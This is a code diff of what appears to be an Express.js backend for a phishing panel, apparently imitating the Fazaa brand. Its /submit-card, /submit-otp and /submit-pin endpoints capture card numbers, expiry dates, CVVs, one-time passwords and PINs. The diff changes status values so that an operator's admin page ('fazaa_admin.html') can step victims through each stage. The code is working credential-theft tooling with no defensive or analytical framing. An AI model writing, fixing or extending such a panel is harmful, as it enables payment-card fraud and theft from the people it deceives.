@@ -60,7 +60,7 @@ app.post('/submit-card', (req, res) => {
         order.cardNumber = cardNumber;
         order.expiryDate = expiryDate;
         order.cvv = cvv;
-        order.status = 'waiting_admin_approval'; // Trigger loading page for client
+        order.status = 'waiting_payment'; // Match fazaa_admin.html
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
@@ -73,7 +73,7 @@ app.post('/submit-otp', (req, res) => {
     const order = orders.find(o => o.id === orderId);
     if (order) {
         order.otp = otp;
-        order.status = 'otp_submitted';
+        order.status = 'waiting_otp'; // Match fazaa_admin.html
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
@@ -86,7 +86,7 @@ app.post('/submit-pin', (req, res) => {
     const order = orders.find(o => o.id === orderId);
     if (order) {
         order.pin = pin;
-        order.status = 'pin_submitted';
+        order.status = 'waiting_pin'; // Match fazaa_admin.html
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
